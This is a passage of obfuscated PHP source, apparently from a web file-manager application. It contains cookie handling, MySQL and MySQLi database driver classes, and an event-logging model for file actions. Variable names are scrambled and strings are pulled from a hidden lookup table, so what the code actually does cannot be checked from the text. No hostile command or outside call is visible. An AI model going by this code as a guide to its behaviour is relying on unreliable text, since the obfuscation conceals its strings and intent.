$ÔİœÖÇß; } private static $sameCookieSet = array(); public static function set($òğ¶é˜á, $àİş™·›, $î’—ò¼¢ = 0, $Ì¬¶¸ı¹ = false, $ÀäşäÈÊ = false) { $ŠÒÆõóÌ =& $_SERVER[±Ö‰ô½¯]; if (self::$cookieDisable) { return; } if (!$î’—ò¼¢) { $î’—ò¼¢ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$òğ¶é˜á]) && self::$sameCookieSet[$òğ¶é˜á] == $àİş™·› . $î’—ò¼¢) { return; } self::$sameCookieSet[$òğ¶é˜á] = $àİş™·› . $î’—ò¼¢; if (!$ÀäşäÈÊ) { $ÀäşäÈÊ = str_replace(HOST, $ŠÒÆõóÌ[12], APP_HOST); $ÀäşäÈÊ = _get($GLOBALS, $ŠÒÆõóÌ[996], $ÀäşäÈÊ); } $µˆ®¨Ÿ = $ŠÒÆõóÌ[12]; setcookie($òğ¶é˜á, $àİş™·›, time() + $î’—ò¼¢, $ŠÒÆõóÌ[8] . trim($ÀäşäÈÊ, $ŠÒÆõóÌ[8]) . $µˆ®¨Ÿ, !1, !1, $Ì¬¶¸ı¹); } public static function setSafe($¾ĞÁ—™, $şÑ¿ãï, $—Ñğ‰¼Â = 0) { self::set($¾ĞÁ—™, $şÑ¿ãï, $—Ñğ‰¼Â, !0); } public static function get($Ïˆğœâ°) { static $ÛÉ„ö€­ = false; if (!$ÛÉ„ö€­) { self::initHeaderCookie(); $ÛÉ„ö€­ = !0; } return isset($_COOKIE[$Ïˆğœâ°]) ? $_COOKIE[$Ïˆğœâ°] : !1; } private static function initHeaderCookie() { $ÃşÙÇè =& $_SERVER[±Ö‰ô½¯]; if (!isset($_SERVER[$ÃşÙÇè[997]]) || !$_SERVER[$ÃşÙÇè[997]]) { return; } $µèÑ¬ú = explode($ÃşÙÇè[74], $_SERVER[$ÃşÙÇè[997]]); foreach ($µèÑ¬ú as $ÎªÍ›ÏÎ) { $ÎªÍ›ÏÎ = explode($ÃşÙÇè[465], $ÎªÍ›ÏÎ); if (count($ÎªÍ›ÏÎ) != 2 || !isset($ÎªÍ›ÏÎ[1])) { continue; } $_COOKIE[trim($ÎªÍ›ÏÎ[0])] = trim($ÎªÍ›ÏÎ[1]); } } public static function remove($¡šØ›Ò³, $®±ÁûïÊ = false) { unset($_COOKIE[$¡šØ›Ò³]); self::set($¡šØ›Ò³, $_SERVER[±Ö‰ô½¯][12], 1, $®±ÁûïÊ); } } class DbMysql extends Db { public function __construct($Î¨åÇ¼  = '') { $âÁ£Ñú =& $_SERVER[±Ö‰ô½¯]; if (!extension_loaded($âÁ£Ñú[901])) { think_exception(think_lang($âÁ£Ñú[14]) . $âÁ£Ñú[998]); } if (!empty($Î¨åÇ¼ )) { $this->config = $Î¨åÇ¼ ; if (empty($this->config[$âÁ£Ñú[17]])) { $this->config[$âÁ£Ñú[17]] = $âÁ£Ñú[12]; } } } public function connect($©¹‹Ñû = '', $´–ñƒø… = 0, $µ—ïŞÜ = false) { $«êĞŞ€ =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->linkID[$´–ñƒø…])) { if (empty($©¹‹Ñû)) { $©¹‹Ñû = $this->config; } $¦ù‰µÜÅ = $©¹‹Ñû[$«êĞŞ€[999]] . ($©¹‹Ñû[$«êĞŞ€[1000]] ? "\72{$©¹‹Ñû[$«êĞŞ€[1000]]}" : $«êĞŞ€[12]); $ô¤Ç–ˆÍ = !empty($©¹‹Ñû[$«êĞŞ€[17]][$«êĞŞ€[18]]) ? $©¹‹Ñû[$«êĞŞ€[17]][$«êĞŞ€[18]] : $this->pconnect; if ($ô¤Ç–ˆÍ) { $this->linkID[$´–ñƒø…] = mysql_pconnect($¦ù‰µÜÅ, $©¹‹Ñû[$«êĞŞ€[1001]], $©¹‹Ñû[$«êĞŞ€[1002]], 131072); } else { $this->linkID[$´–ñƒø…] = mysql_connect($¦ù‰µÜÅ, $©¹‹Ñû[$«êĞŞ€[1001]], $©¹‹Ñû[$«êĞŞ€[1002]], !0, 131072); } if (!$this->linkID[$´–ñƒø…] || !empty($©¹‹Ñû[$«êĞŞ€[21]]) && !mysql_select_db($©¹‹Ñû[$«êĞŞ€[21]], $this->linkID[$´–ñƒø…])) { think_exception(mysql_error()); } $®×ëÂ… = mysql_get_server_info($this->linkID[$´–ñƒø…]); mysql_query($«êĞŞ€[1003] . think_config($«êĞŞ€[1004]) . $«êĞŞ€[58], $this->linkID[$´–ñƒø…]); if ($®×ëÂ… > $«êĞŞ€[1005]) { mysql_query($«êĞŞ€[1006], $this->linkID[$´–ñƒø…]); } $this->connected = !0; if (1 != think_config($«êĞŞ€[22])) { unset($this->config); } } return $this->linkID[$´–ñƒø…]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($úı­Ú) { $µ¿¬œ“ =& $_SERVER[±Ö‰ô½¯]; if (0 === stripos($úı­Ú, $µ¿¬œ“[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úı­Ú; if ($this->queryID) { $this->free(); } think_action_status($µ¿¬œ“[23], 1); think_status($µ¿¬œ“[24]); $this->queryID = mysql_query($úı­Ú, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($£â„ëÄ) { $ƒÄö‰Ò½ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $£â„ëÄ; if ($this->queryID) { $this->free(); } think_action_status($ƒÄö‰Ò½[25], 1); think_status($ƒÄö‰Ò½[24]); $£¨…ËÀ¹ = mysql_query($£â„ëÄ, $this->_linkID); $this->debug(); if (!1 === $£¨…ËÀ¹) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[±Ö‰ô½¯][1007], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $şÊ•¸õà = mysql_query($_SERVER[±Ö‰ô½¯][1008], $this->_linkID); $this->transTimes = 0; if (!$şÊ•¸õà) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ãƒ´ã· = mysql_query($_SERVER[±Ö‰ô½¯][1009], $this->_linkID); $this->transTimes = 0; if (!$ãƒ´ã·) { $this->error(); return !1; } } return !0; } private function getAll() { $êÌå¨“ = array(); if ($this->numRows > 0) { while ($˜ŒØ†Ü± = mysql_fetch_assoc($this->queryID)) { $êÌå¨“[] = $˜ŒØ†Ü±; } mysql_data_seek($this->queryID, 0); } return $êÌå¨“; } public function getFields($…ÕÁšÏ) { $š˜ïİ¥Î =& $_SERVER[±Ö‰ô½¯]; $ÁïêÍºÙ = $this->query($š˜ïİ¥Î[1010] . $this->parseKey($…ÕÁšÏ)); $¿©ÍŸè = array(); if ($ÁïêÍºÙ) { foreach ($ÁïêÍºÙ as $èïú€š  => $±²¯ó¢è) { $¿©ÍŸè[$±²¯ó¢è[$š˜ïİ¥Î[31]]] = array($š˜ïİ¥Î[32] => $±²¯ó¢è[$š˜ïİ¥Î[31]], $š˜ïİ¥Î[33] => $±²¯ó¢è[$š˜ïİ¥Î[34]], $š˜ïİ¥Î[35] => (bool) (strtoupper($±²¯ó¢è[$š˜ïİ¥Î[36]]) === $š˜ïİ¥Î[1011]), $š˜ïİ¥Î[37] => $±²¯ó¢è[$š˜ïİ¥Î[38]], $š˜ïİ¥Î[39] => strtolower($±²¯ó¢è[$š˜ïİ¥Î[40]]) == $š˜ïİ¥Î[41], $š˜ïİ¥Î[42] => strtolower($±²¯ó¢è[$š˜ïİ¥Î[43]]) == $š˜ïİ¥Î[44]); } } return $¿©ÍŸè; } public function getTables($ô«•—“¯ = '') { $³…†ã–¡ =& $_SERVER[±Ö‰ô½¯]; if (!empty($ô«•—“¯)) { $ôÂâ²¥é = $³…†ã–¡[1012] . $ô«•—“¯ . $³…†ã–¡[1013]; } else { $ôÂâ²¥é = $³…†ã–¡[1014]; } $‚ „Ä¥Ú = $this->query($ôÂâ²¥é); $…¤—¿… = array(); foreach ($‚ „Ä¥Ú as $³«§¨¸“ => $æ˜Æî‡) { $…¤—¿…[$³«§¨¸“] = current($æ˜Æî‡); } return $…¤—¿…; } public function replace($¬÷Úè, $¬ìÃÀ›§ = array()) { $¤ó¡Ø¯µ =& $_SERVER[±Ö‰ô½¯]; foreach ($¬÷Úè as $Ä¬›’‚ => $Ì‹üâ®») { $¬Ò¨Ï¶ˆ = $this->parseValue($Ì‹üâ®»); if (is_scalar($¬Ò¨Ï¶ˆ)) { $àƒ­©[] = $¬Ò¨Ï¶ˆ; $Ä§Ş¹Î[] = $this->parseKey($Ä¬›’‚); } } $ÒêòÁÓİ = $¤ó¡Ø¯µ[1015] . $this->parseTable($¬ìÃÀ›§[$¤ó¡Ø¯µ[359]]) . $¤ó¡Ø¯µ[1016] . implode($¤ó¡Ø¯µ[50], $Ä§Ş¹Î) . $¤ó¡Ø¯µ[1017] . implode($¤ó¡Ø¯µ[50], $àƒ­©) . $¤ó¡Ø¯µ[1018]; return $this->execute($ÒêòÁÓİ); } public function insertAll($‹Í£–³, $¦‡Ì²èÖ = array(), $ªğ“Šø­ = false) { $Ãè¥˜İñ =& $_SERVER[±Ö‰ô½¯]; if (!is_array($‹Í£–³[0])) { return !1; } $æ£“ó¹Ï = array_keys($‹Í£–³[0]); $´Â…Å™ü = array(); foreach ($‹Í£–³ as $©º¯Äøë) { $“£¶ İ = array(); foreach ($©º¯Äøë as $Ğ¡ˆ¸Åø => $ ¬‡’¡¸) { $ ¬‡’¡¸ = $this->parseValue($ ¬‡’¡¸); if (is_scalar($ ¬‡’¡¸)) { $“£¶ İ[] = $ ¬‡’¡¸; } } $´Â…Å™ü[] = $Ãè¥˜İñ[339] . implode($Ãè¥˜İñ[50], $“£¶ İ) . $Ãè¥˜İñ[1018]; } array_walk($æ£“ó¹Ï, array($this, $Ãè¥˜İñ[1019])); $ó´ìà = $ªğ“Šø­ ? $Ãè¥˜İñ[1020] : $Ãè¥˜İñ[1021]; $ó´ìà = $Ãè¥˜İñ[1021]; $çÍß³’¥ = $ó´ìà . $Ãè¥˜İñ[1022] . $this->parseTable($¦‡Ì²èÖ[$Ãè¥˜İñ[359]]) . $Ãè¥˜İñ[1016] . implode($Ãè¥˜İñ[50], $æ£“ó¹Ï) . $Ãè¥˜İñ[1023] . implode($Ãè¥˜İñ[50], $´Â…Å™ü); if ($ªğ“Šø­) { $¶„ÏÏâ = array(); foreach ($æ£“ó¹Ï as $Ğ¡ˆ¸Åø) { if ($Ğ¡ˆ¸Åø == $Ãè¥˜İñ[233] || $Ğ¡ˆ¸Åø == $Ãè¥˜İñ[1024]) { continue; } $¶„ÏÏâ[] = $Ğ¡ˆ¸Åø . $Ãè¥˜İñ[1025] . $Ğ¡ˆ¸Åø . $Ãè¥˜İñ[1018]; } $çÍß³’¥ .= $Ãè¥˜İñ[1026] . implode($Ãè¥˜İñ[50], $¶„ÏÏâ); } return $this->execute($çÍß³’¥); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ö”Ñ‹ÇÉ =& $_SERVER[±Ö‰ô½¯]; $this->error = mysql_errno() . $Ö”Ñ‹ÇÉ[4] . mysql_error($this->_linkID); if ($Ö”Ñ‹ÇÉ[12] != $this->queryStr) { $this->error .= LNG($Ö”Ñ‹ÇÉ[48]) . $this->queryStr; } think_trace($this->error, $Ö”Ñ‹ÇÉ[12], $Ö”Ñ‹ÇÉ[49]); return $this->error; } public function escapeString($éüÙşá½) { if ($this->_linkID) { return mysql_real_escape_string($éüÙşá½, $this->_linkID); } else { return mysql_escape_string($éüÙşá½); } } public function parseKey(&$ƒ‘é”¯œ, $ü°Ê¿Çï = true) { $Ù™Ô”­Ë =& $_SERVER[±Ö‰ô½¯]; if ($ü°Ê¿Çï) { $ƒ‘é”¯œ = $this->parseKeyCheck($ƒ‘é”¯œ); } if ($ƒ‘é”¯œ != $Ù™Ô”­Ë[222] && !preg_match($Ù™Ô”­Ë[1027], $ƒ‘é”¯œ)) { $ƒ‘é”¯œ = $Ù™Ô”­Ë[473] . trim($ƒ‘é”¯œ, $Ù™Ô”­Ë[473]) . $Ù™Ô”­Ë[473]; } return $ƒ‘é”¯œ; } } class DbMysqli extends Db { public function __construct($Ì£ˆ˜‘Ù = '') { $”¥³À¼ =& $_SERVER[±Ö‰ô½¯]; if (!extension_loaded($”¥³À¼[1028])) { think_exception(think_lang($”¥³À¼[14]) . $”¥³À¼[1029]); } if (!empty($Ì£ˆ˜‘Ù)) { $this->config = $Ì£ˆ˜‘Ù; if (empty($this->config[$”¥³À¼[17]])) { $this->config[$”¥³À¼[17]] = $”¥³À¼[12]; } } } public function connect($Ë£İçµñ = '', $‘Ÿı¥ = 0) { $¸ÌÎ‹áÈ =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->linkID[$‘Ÿı¥])) { if (empty($Ë£İçµñ)) { $Ë£İçµñ = $this->config; } $this->linkID[$‘Ÿı¥] = new mysqli($Ë£İçµñ[$¸ÌÎ‹áÈ[999]], $Ë£İçµñ[$¸ÌÎ‹áÈ[1001]], $Ë£İçµñ[$¸ÌÎ‹áÈ[1002]], $Ë£İçµñ[$¸ÌÎ‹áÈ[21]], $Ë£İçµñ[$¸ÌÎ‹áÈ[1000]] ? intval($Ë£İçµñ[$¸ÌÎ‹áÈ[1000]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‡¼‚êóè = $this->linkID[$‘Ÿı¥]->server_version; $this->linkID[$‘Ÿı¥]->query($¸ÌÎ‹áÈ[1003] . think_config($¸ÌÎ‹áÈ[1004]) . $¸ÌÎ‹áÈ[58]); if ($‡¼‚êóè > $¸ÌÎ‹áÈ[1005]) { $this->linkID[$‘Ÿı¥]->query($¸ÌÎ‹áÈ[1006]); } $this->connected = !0; if (1 != think_config($¸ÌÎ‹áÈ[22])) { unset($this->config); } } return $this->linkID[$‘Ÿı¥]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Õ›Ø¤·) { $¼£Áñˆ­ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Õ›Ø¤·; if ($this->queryID) { $this->free(); } think_action_status($¼£Áñˆ­[23], 1); think_status($¼£Áñˆ­[24]); $this->queryID = $this->_linkID->query($Õ›Ø¤·); if ($this->_linkID->more_results()) { while (($£¯¹¥êÊ = $this->_linkID->next_result()) != NULL) { $£¯¹¥êÊ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÁôÍ‡Æ) { $²îŒí­ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁôÍ‡Æ; if ($this->queryID) { $this->free(); } think_action_status($²îŒí­[25], 1); think_status($²îŒí­[24]); $ Ê‰¦Ğ = $this->_linkID->query($ÁôÍ‡Æ); $this->debug(); if (!1 === $ Ê‰¦Ğ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $õ“…ôœ¯ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$õ“…ôœ¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»ñ¤ŠÄ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»ñ¤ŠÄ) { $this->error(); return !1; } } return !0; } private function getAll() { $ó¼”›¹ = array(); if ($this->numRows > 0) { for ($›ÁÀü = 0; $›ÁÀü < $this->numRows; $›ÁÀü++) { $ó¼”›¹[$›ÁÀü] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ó¼”›¹; } public function getFields($É©‚ûõ¯) { $úş©Ä¼ı =& $_SERVER[±Ö‰ô½¯]; $½Õğ¹õœ = $this->query($úş©Ä¼ı[1010] . $this->parseKey($É©‚ûõ¯)); $÷Ûã²•¸ = array(); if ($½Õğ¹õœ) { foreach ($½Õğ¹õœ as $•Äş²‹¸ => $Ä«“×±) { $÷Ûã²•¸[$Ä«“×±[$úş©Ä¼ı[31]]] = array($úş©Ä¼ı[32] => $Ä«“×±[$úş©Ä¼ı[31]], $úş©Ä¼ı[33] => $Ä«“×±[$úş©Ä¼ı[34]], $úş©Ä¼ı[35] => (bool) ($Ä«“×±[$úş©Ä¼ı[36]] === $úş©Ä¼ı[12]), $úş©Ä¼ı[37] => $Ä«“×±[$úş©Ä¼ı[38]], $úş©Ä¼ı[39] => strtolower($Ä«“×±[$úş©Ä¼ı[40]]) == $úş©Ä¼ı[41], $úş©Ä¼ı[42] => strtolower($Ä«“×±[$úş©Ä¼ı[43]]) == $úş©Ä¼ı[44]); } } return $÷Ûã²•¸; } public function getTables($«ë“¬¼Á = '') { $“Ë´¢é =& $_SERVER[±Ö‰ô½¯]; $Ğ±Àë¥µ = !empty($«ë“¬¼Á) ? $“Ë´¢é[1012] . $«ë“¬¼Á . $“Ë´¢é[1013] : $“Ë´¢é[1014]; $Ç¾îúîÌ = $this->query($Ğ±Àë¥µ); $Í”¬¦ˆ = array(); if ($Ç¾îúîÌ) { foreach ($Ç¾îúîÌ as $ÚÛâÛŞ => $ï»óÁøÅ) { $Í”¬¦ˆ[$ÚÛâÛŞ] = current($ï»óÁøÅ); } } return $Í”¬¦ˆ; } public function replace($šéš¹™Š, $éÊ°é¥ = array()) { $¬ŒÉ“Ú =& $_SERVER[±Ö‰ô½¯]; foreach ($šéš¹™Š as $‰¬‘Óïñ => $øåŸ²Å) { $·¾çŠ§Ì = $this->parseValue($øåŸ²Å); if (is_scalar($·¾çŠ§Ì)) { $Ä¿¥¹×®[] = $·¾çŠ§Ì; $üŠ«ÜŞş[] = $this->parseKey($‰¬‘Óïñ); } } $“™ˆãû€ = $¬ŒÉ“Ú[1015] . $this->parseTable($éÊ°é¥[$¬ŒÉ“Ú[359]]) . $¬ŒÉ“Ú[1016] . implode($¬ŒÉ“Ú[50], $üŠ«ÜŞş) . $¬ŒÉ“Ú[1017] . implode($¬ŒÉ“Ú[50], $Ä¿¥¹×®) . $¬ŒÉ“Ú[1018]; return $this->execute($“™ˆãû€); } public function insertAll($ë¡æçÉû, $À¿”ĞŒş = array(), $ı¨¢…‡ = false) { $€äş•„î =& $_SERVER[±Ö‰ô½¯]; if (!is_array($ë¡æçÉû[0])) { return !1; } $Ğ®¸ĞÏ = array_keys($ë¡æçÉû[0]); $½ûö¬± = array(); foreach ($ë¡æçÉû as $¬‘›±Éš) { $šõ£şœ = array(); foreach ($¬‘›±Éš as $ıº““ˆ˜ => $‰ïÚ–ëğ) { $‰ïÚ–ëğ = $this->parseValue($‰ïÚ–ëğ); if (is_scalar($‰ïÚ–ëğ)) { $šõ£şœ[] = $‰ïÚ–ëğ; } } $½ûö¬±[] = $€äş•„î[339] . implode($€äş•„î[50], $šõ£şœ) . $€äş•„î[1018]; } array_walk($Ğ®¸ĞÏ, array($this, $€äş•„î[1019])); $²¸·²Ø’ = $ı¨¢…‡ ? $€äş•„î[1020] : $€äş•„î[1021]; $²¸·²Ø’ = $€äş•„î[1021]; $Æ†‚¾Î­ = $²¸·²Ø’ . $€äş•„î[1022] . $this->parseTable($À¿”ĞŒş[$€äş•„î[359]]) . $€äş•„î[1016] . implode($€äş•„î[50], $Ğ®¸ĞÏ) . $€äş•„î[1023] . implode($€äş•„î[50], $½ûö¬±); if ($ı¨¢…‡) { $û–ƒñ¸¼ = array(); foreach ($Ğ®¸ĞÏ as $ıº““ˆ˜) { if ($ıº““ˆ˜ == $€äş•„î[233] || $ıº““ˆ˜ == $€äş•„î[1024]) { continue; } $û–ƒñ¸¼[] = $ıº““ˆ˜ . $€äş•„î[1025] . $ıº““ˆ˜ . $€äş•„î[1018]; } $Æ†‚¾Î­ .= $€äş•„î[1026] . implode($€äş•„î[50], $û–ƒñ¸¼); } return $this->execute($Æ†‚¾Î­); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÆîèÑä› =& $_SERVER[±Ö‰ô½¯]; $this->error = $this->_linkID->errno . $ÆîèÑä›[4] . $this->_linkID->error; if ($ÆîèÑä›[12] != $this->queryStr) { $this->error .= LNG($ÆîèÑä›[48]) . $this->queryStr; } think_trace($this->error, $ÆîèÑä›[12], $ÆîèÑä›[49]); return $this->error; } public function escapeString($ıé•Ô½º) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ıé•Ô½º); } else { return addslashes($ıé•Ô½º); } } public function parseKey(&$Ì†††¾¿, $Å®Ñ¬ªû = true) { $ú¿¡Şºé =& $_SERVER[±Ö‰ô½¯]; if ($Å®Ñ¬ªû) { $Ì†††¾¿ = $this->parseKeyCheck($Ì†††¾¿); } if ($Ì†††¾¿ != $ú¿¡Şºé[222] && !preg_match($ú¿¡Şºé[1027], $Ì†††¾¿)) { $Ì†††¾¿ = $ú¿¡Şºé[473] . trim($Ì†††¾¿, $ú¿¡Şºé[473]) . $ú¿¡Şºé[473]; } return $Ì†††¾¿; } } goto DÎÚ´Ó¦…; B„Š„Õ¢¶: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\x63\145\x5f\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\124\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x64\x65\163\143", '', "\x69\x6e\163\x65\162\x74\54\x75\x70\x64\141\x74\145\x2c\163\x65\154\x65\143\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¬÷ñ¿´à, $úÚ¯—Ãõ, $ƒø¶Ã¯  = '') { $èÉ¨›£ =& $_SERVER[±Ö‰ô½¯]; if (!$this->eventSave) { return; } $—ÊÅ–ÌÇ = Model($èÉ¨›£[1482])->sourceInfo($¬÷ñ¿´à); if (!$—ÊÅ–ÌÇ) { return !1; } if ($this->isDisableEvent($—ÊÅ–ÌÇ, $úÚ¯—Ãõ)) { return; } if ($ƒø¶Ã¯  && is_string($ƒø¶Ã¯ )) { $ƒø¶Ã¯  = array($èÉ¨›£[2174] => $ƒø¶Ã¯ ); } $ŠÊÅ²ú¯ = KodUser::id(); $‡éµ§‡é = array($èÉ¨›£[503] => $¬÷ñ¿´à, $èÉ¨›£[2365] => $—ÊÅ–ÌÇ[$èÉ¨›£[192]], $èÉ¨›£[2366] => $—ÊÅ–ÌÇ[$èÉ¨›£[32]], $èÉ¨›£[599] => !empty($—ÊÅ–ÌÇ[$èÉ¨›£[599]]) ? $—ÊÅ–ÌÇ[$èÉ¨›£[599]] : $èÉ¨›£[12], $èÉ¨›£[1921] => $ŠÊÅ²ú¯, $èÉ¨›£[508] => $úÚ¯—Ãõ, $èÉ¨›£[1923] => $ƒø¶Ã¯ ); $this->addSystemLog($úÚ¯—Ãõ, $‡éµ§‡é); unset($‡éµ§‡é[$èÉ¨›£[2366]], $‡éµ§‡é[$èÉ¨›£[599]]); return $this->add($‡éµ§‡é); } private function addSystemLog($ìŠÏéÔ«, $ûâÒ„çÍ) { $â·ó¬Ï =& $_SERVER[±Ö‰ô½¯]; if ($ìŠÏéÔ« == $â·ó¬Ï[2367]) { $ìŠÏéÔ« = $ûâÒ„çÍ[$â·ó¬Ï[537]][$â·ó¬Ï[2368]]; } else { if (in_array($ìŠÏéÔ«, array($â·ó¬Ï[1512], $â·ó¬Ï[2369]))) { $ìŠÏéÔ« = $ûâÒ„çÍ[$â·ó¬Ï[537]][$â·ó¬Ï[170]]; } } $ÛŸõùç· = array_merge($ûâÒ„çÍ, array($â·ó¬Ï[2370] => $ûâÒ„çÍ[$â·ó¬Ï[193]], $â·ó¬Ï[2371] => $ûâÒ„çÍ[$â·ó¬Ï[2371]])); Hook::trigger($â·ó¬Ï[2372], $â·ó¬Ï[2373] . $ìŠÏéÔ«, $ûâÒ„çÍ); Model($â·ó¬Ï[2083])->addLog($â·ó¬Ï[2373] . $ìŠÏéÔ«, $ÛŸõùç·); } private function isDisableEvent($Â´šËñı, $ö¸â«‚) { $ÅÑ¥¢¾» =& $_SERVER[±Ö‰ô½¯]; if ($Â´šËñı[$ÅÑ¥¢¾»[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ö¸â«‚ == $ÅÑ¥¢¾»[1280]) { return !1; } return !0; } public function eventCreate($£˜Åù©, $°î×Ï…Û) { $”–şß¶ =& $_SERVER[±Ö‰ô½¯]; $‡·¯Óİ’ = Model($”–şß¶[1482])->sourceInfo($£˜Åù©); $«‚Ú’ÑÀ = array($”–şß¶[2368] => $°î×Ï…Û, $”–şß¶[32] => $‡·¯Óİ’[$”–şß¶[32]]); return $this->addEvent($£˜Åù©, $”–şß¶[2367], $«‚Ú’ÑÀ); } public function eventFileEdit($¿Í‚í©) { $â¡‹ÇÉ˜ =& $_SERVER[±Ö‰ô½¯]; $×©Ü›ãÌ = array($â¡‹ÇÉ˜[2374] => $_SERVER[$â¡‹ÇÉ˜[2375]], $â¡‹ÇÉ˜[2376] => strtolower(ACTION)); if (isset($GLOBALS[$â¡‹ÇÉ˜[7]][$â¡‹ÇÉ˜[1572]])) { $×©Ü›ãÌ[$â¡‹ÇÉ˜[1572]] = $â¡‹ÇÉ˜[91]; } return $this->addEvent($¿Í‚í©, $â¡‹ÇÉ˜[1511], $×©Ü›ãÌ); } public function eventRecycle($ãÛ‚—˜Ğ, $±¬×‘) { return $this->addEvent($ãÛ‚—˜Ğ, $_SERVER[±Ö‰ô½¯][2369], $±¬×‘); } private static $_removeLast = ''; public function eventRemove($ì©Ÿˆ·š) { $ä©ÓËæ« =& $_SERVER[±Ö‰ô½¯]; self::$_removeLast = $ì©Ÿˆ·š; $ôÎŞ¡Á£ = Model($ä©ÓËæ«[1482])->sourceInfo($ì©Ÿˆ·š); $ŠùˆÄØ™ = array_field_key($ôÎŞ¡Á£, array($ä©ÓËæ«[193], $ä©ÓËæ«[554], $ä©ÓËæ«[517], $ä©ÓËæ«[601])); $‹êíıß = array($ä©ÓËæ«[170] => $ôÎŞ¡Á£[$ä©ÓËæ«[32]], $ä©ÓËæ«[2376] => ACTION, $ä©ÓËæ«[2377] => $ŠùˆÄØ™); return $this->addEvent($ôÎŞ¡Á£[$ä©ÓËæ«[192]], $ä©ÓËæ«[1280], $‹êíıß); } public function eventShare($§Óİ†Ã‡, $ëØ¾¬ºß) { return $this->addEvent($§Óİ†Ã‡, $_SERVER[±Ö‰ô½¯][1512], $ëØ¾¬ºß); } public function eventMove($§Äàª, $ÒŸÕÁ–, $‰™·š½ï) { $Àò¦Áïô =& $_SERVER[±Ö‰ô½¯]; if (self::$_removeLast == $§Äàª) { return; } $èû­ÙÕğ = Model($Àò¦Áïô[1482]); $×¬Èß = $èû­ÙÕğ->sourceInfo($§Äàª); $ŠşÙ½Ù§ = $èû­ÙÕğ->sourceInfo($ÒŸÕÁ–); $ƒİğÓÎ = $èû­ÙÕğ->sourceInfo($‰™·š½ï); $‹§Û‚êÏ = array($Àò¦Áïô[1292] => $ÒŸÕÁ–, $Àò¦Áïô[2378] => $ŠşÙ½Ù§[$Àò¦Áïô[32]], $Àò¦Áïô[2336] => !empty($ŠşÙ½Ù§[$Àò¦Áïô[599]]) ? $ŠşÙ½Ù§[$Àò¦Áïô[599]] : $Àò¦Áïô[12], $Àò¦Áïô[1293] => $‰™·š½ï, $Àò¦Áïô[2379] => $ƒİğÓÎ[$Àò¦Áïô[32]], $Àò¦Áïô[2380] => !empty($ƒİğÓÎ[$Àò¦Áïô[599]]) ? $ƒİğÓÎ[$Àò¦Áïô[599]] : $Àò¦Áïô[12]); $this->addEvent($§Äàª, $Àò¦Áïô[640], $‹§Û‚êÏ); $×¬Èß = $èû­ÙÕğ->sourceInfo($§Äàª); $‹§Û‚êÏ = array($Àò¦Áïô[193] => $×¬Èß[$Àò¦Áïô[193]], $Àò¦Áïô[32] => $×¬Èß[$Àò¦Áïô[32]]); $this->addEvent($ÒŸÕÁ–, $Àò¦Áïô[2381], $‹§Û‚êÏ); } public function eventCopy($œââÚÂ’) { $this->eventCreate($œââÚÂ’, $_SERVER[±Ö‰ô½¯][638]); } public function eventRename($öÌÌÔğŠ, $­â•ã‹, $æ©Àü÷) { $š¡îœ÷õ =& $_SERVER[±Ö‰ô½¯]; $Ş¯ü­©  = array($š¡îœ÷õ[1292] => $­â•ã‹, $š¡îœ÷õ[1293] => $æ©Àü÷); return $this->addEvent($öÌÌÔğŠ, $š¡îœ÷õ[1496], $Ş¯ü­© ); } public function eventAddComment($¨×åÜ•, $È€ÁÓöÎ) { return $this->addEvent($¨×åÜ•, $_SERVER[±Ö‰ô½¯][2382], $È€ÁÓöÎ); } public function eventAddDesc($î˜®Ñ—ä, $˜˜ı‡À) { return $this->addEvent($î˜®Ñ—ä, $_SERVER[±Ö‰ô½¯][2383], $˜˜ı‡À); } public function listBySource($Æ¾€íÒÖ) { $Òç’•ÂÔ =& $_SERVER[±Ö‰ô½¯]; $¡å®ó = 